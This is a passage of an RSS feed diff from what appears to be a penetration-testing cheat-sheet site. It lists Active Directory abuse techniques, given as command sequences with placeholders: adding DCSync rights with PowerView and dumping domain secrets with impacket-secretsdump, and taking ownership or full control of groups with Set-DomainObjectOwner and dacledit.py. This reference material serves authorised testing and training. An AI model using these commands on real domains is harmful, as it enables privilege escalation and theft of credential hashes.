       <description>Preparation 0. Check Systeminfo # Windows Pro is needed systeminfo 1. Connect to VPN OpenVPN client&#xA;2. Add DNS Server +-----------------------------------------------------------------------------------+ | 1. Go to &amp;#39;Control Panel\Network and Internet\Network and Sharing Center&amp;#39; | | 2. Click &amp;#39;Local Area Connection&amp;#39; | | 3. Go to &amp;#39;Properties&amp;#39; -&amp;gt; &amp;#39;Internet Protocol Version 4 (TCP/IPv4)&amp;#39; -&amp;gt; &amp;#39;Properties&amp;#39; | | 4. Under &amp;#39;General&amp;#39;, check &amp;#39;Obtain an IP address automatically&amp;#39; | | 5. Check &amp;#39;Use the following DNS address&amp;#39; -&amp;gt; &amp;#39;Prefer DNS Server&amp;#39; -&amp;gt; &amp;lt;DC_IP&amp;gt; | +-----------------------------------------------------------------------------------+ 3.</description>
+    </item>
+    <item>
+      <title>WriteDacl</title>
+      <link>https://tldrbins.github.io/writedacl/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/writedacl/</guid>
+      <description>Abuse #1: Add dcsync right to user Windows 1. Import PowerView . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Add dcsync right Add-DomainObjectAcl -PrincipalIdentity &amp;lt;USER&amp;gt; -TargetIdentity &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;TARGET_GROUP&amp;gt;&amp;#39; -Rights DCSync -Credential $cred 4. Secrets dump Linux impacket-secretsdump &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; </description>
+    </item>
+    <item>
+      <title>WriteOwner/Own</title>
+      <link>https://tldrbins.github.io/writeowner/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/writeowner/</guid>
+      <description>Abuse #1 : Change owner of the group Windows 1. Import PowerView . .\PowerView.ps1 2. Change owner Set-DomainObjectOwner -Identity &amp;lt;TARGET_GROUP&amp;gt; -OwnerIdentity &amp;lt;TARGET_USER&amp;gt; Abuse #2 : Add user to the group Linux Windows 0. Install latest impacket (included dacledit.py) git clone https://github.com/fortra/impacket.git cd impacket pip3 install . 1. Add full control permission to the user over the group sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; dacledit.py -k &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -principal &amp;lt;USER&amp;gt; -target &amp;lt;TARGET_GROUP&amp;gt; -inheritance -action write -rights FullControl 2.</description>
     </item>
   </channel>
 </rss>
